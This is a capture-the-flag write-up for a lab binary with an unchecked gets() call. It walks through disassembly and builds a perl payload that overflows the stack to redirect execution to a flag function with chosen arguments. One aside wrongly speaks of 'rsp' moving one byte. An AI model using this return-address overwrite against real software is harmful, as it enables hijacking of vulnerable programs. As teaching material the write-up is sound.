# OverFlow 2

Program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Solution

We want to call: `flag(0xDEADBEEF, 0xC0DED00D)`, this can be achieved by
abusing the insecure `gets` call in `vuln` to overflow the buffer. In
particular overflow the buffer to rewrite the return address from this function
and the location of the arguments to vuln.

### Constructing the Payload to Overwrite Return Address

First let's find the address of the target function:

```
$ objdump -d vuln | grep '<flag>'
080485e6 <flag>:
```

So we want to use `0x080485e6`.

Next let's investigate the disassembled `vuln` function, noting how far from
the top of the stack the buffer is allocated:

```
$ objdump -dM intel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p'
08048676 <vuln>:
 8048676:	55                   	push   ebp      <----- -0x4
 8048677:	89 e5                	mov    ebp,esp
 8048679:	53                   	push   ebx      <----- -0x4
 804867a:	81 ec b4 00 00 00    	sub    esp,0xb4 <----- -0xb4 (allocating our buffer)
 8048680:	e8 9b fe ff ff       	call   8048520 <__x86.get_pc_thunk.bx>
 8048685:	81 c3 7b 19 00 00    	add    ebx,0x197b
 804868b:	83 ec 0c             	sub    esp,0xc
 804868e:	8d 85 48 ff ff ff    	lea    eax,[ebp-0xb8]
 8048694:	50                   	push   eax
 8048695:	e8 96 fd ff ff       	call   8048430 <gets@plt>
 804869a:	83 c4 10             	add    esp,0x10
 804869d:	83 ec 0c             	sub    esp,0xc
 80486a0:	8d 85 48 ff ff ff    	lea    eax,[ebp-0xb8]
 80486a6:	50                   	push   eax
 80486a7:	e8 b4 fd ff ff       	call   8048460 <puts@plt>
 80486ac:	83 c4 10             	add    esp,0x10
 80486af:	90                   	nop
 80486b0:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80486b3:	c9                   	leave
 80486b4:	c3                   	ret
```

Recalling that the return address of the function will be on the top of the
stack when we enter the function, this means we have to overwrite `0x4 + 0x4 +
0xb4 = 0xbc` bytes before the return address. The first part of our payload
could then be constructed as:

```
$ perl -e 'print "A" x 0xbc . "\xe6\x85\x04\x08"'
```

### Constructing the Payload to Overwrite Parameters

Now let's figure out how parameters are handled in the `flag` function:

```
$ objdump -dM intel vuln | sed -n '/^[a-f0-9]\+ <flag>/,/^$/p'
080485e6 <flag>:
 80485e6:	55                   	push   ebp
 80485e7:	89 e5                	mov    ebp,esp
 80485e9:	53                   	push   ebx
 80485ea:	83 ec 54             	sub    esp,0x54
 80485ed:	e8 2e ff ff ff       	call   8048520 <__x86.get_pc_thunk.bx>
 80485f2:	81 c3 0e 1a 00 00    	add    ebx,0x1a0e
 80485f8:	83 ec 08             	sub    esp,0x8
 80485fb:	8d 83 b0 e7 ff ff    	lea    eax,[ebx-0x1850]
 8048601:	50                   	push   eax
 8048602:	8d 83 b2 e7 ff ff    	lea    eax,[ebx-0x184e]
 8048608:	50                   	push   eax
 8048609:	e8 92 fe ff ff       	call   80484a0 <fopen@plt>
 804860e:	83 c4 10             	add    esp,0x10
 8048611:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 8048614:	83 7d f4 00          	cmp    DWORD PTR [ebp-0xc],0x0
 8048618:	75 1c                	jne    8048636 <flag+0x50>
 804861a:	83 ec 0c             	sub    esp,0xc
 804861d:	8d 83 bc e7 ff ff    	lea    eax,[ebx-0x1844]
 8048623:	50                   	push   eax
 8048624:	e8 37 fe ff ff       	call   8048460 <puts@plt>
 8048629:	83 c4 10             	add    esp,0x10
 804862c:	83 ec 0c             	sub    esp,0xc
 804862f:	6a 00                	push   0x0
 8048631:	e8 3a fe ff ff       	call   8048470 <exit@plt>
 8048636:	83 ec 04             	sub    esp,0x4
 8048639:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 804863c:	6a 40                	push   0x40
 804863e:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048641:	50                   	push   eax
 8048642:	e8 f9 fd ff ff       	call   8048440 <fgets@plt>
 8048647:	83 c4 10             	add    esp,0x10
 804864a:	81 7d 08 ef be ad de 	cmp    DWORD PTR [ebp+0x8],0xdeadbeef   <----- arg1
 8048651:	75 1a                	jne    804866d <flag+0x87>
 8048653:	81 7d 0c 0d d0 de c0 	cmp    DWORD PTR [ebp+0xc],0xc0ded00d   <----- arg2
 804865a:	75 14                	jne    8048670 <flag+0x8a>
 804865c:	83 ec 0c             	sub    esp,0xc
 804865f:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048662:	50                   	push   eax
 8048663:	e8 b8 fd ff ff       	call   8048420 <printf@plt>
 8048668:	83 c4 10             	add    esp,0x10
 804866b:	eb 04                	jmp    8048671 <flag+0x8b>
 804866d:	90                   	nop
 804866e:	eb 01                	jmp    8048671 <flag+0x8b>
 8048670:	90                   	nop
 8048671:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8048674:	c9                   	leave
 8048675:	c3                   	ret
```

So the arguments are located at `ebp+0x8` and `ebp+0xc`, so now we would like
to know how `ebp` relates to the state of the stack we've modified. When we
leave `vuln` the address of `flag` is at the top of stack. _From my
understanding_ (based on [this](https://www.felixcloutier.com/x86/ret)) the
`ret` instruction in `vuln` will pop the return address off the stack, so when
we enter this function `rsp` will be pointing one byte _above_ the address
we've overwritten. Now let's find `ebp` in relation to `esp`:

```
080485e6 <flag>:
 80485e6:	55                   	push   ebp      <----- -0x4
 80485e7:	89 e5                	mov    ebp,esp  <----- ebp=esp
```

So our first variable, in `ebp+0x8` will be `0x4` bytes above the address we've
overwritten (and the second variable `0x4` above that). This means we will have
to add some padding before injecting the values we want, so we could construct:

```
$ perl -E 'print "A" x 0xbc . "\xe6\x85\x04\x08"
   . "BBBB"
   . "\xef\xbe\xad\xde"
   . "\x0d\xd0\xde\xc0"'
```

Where the first line is taken from the payload constructed above, the second
line is the required padding and the last two are the variables.
